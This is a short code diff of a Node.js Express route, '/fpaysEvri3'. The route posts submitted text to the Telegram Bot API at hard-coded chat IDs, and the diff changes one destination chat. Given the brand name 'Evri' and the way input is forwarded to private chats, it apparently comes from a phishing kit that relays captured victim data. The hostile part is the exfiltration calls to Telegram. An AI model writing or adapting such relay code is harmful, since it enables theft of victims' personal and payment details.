@@ -1841,7 +1841,7 @@ app.post('/fpaysEvri3', (req, res) => {
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
             );
             axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-738279059&text=Evri:\n${originalText}`
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-1001708890887&text=Evri:\n${originalText}`
             );
             fpaysC += 1;
         }
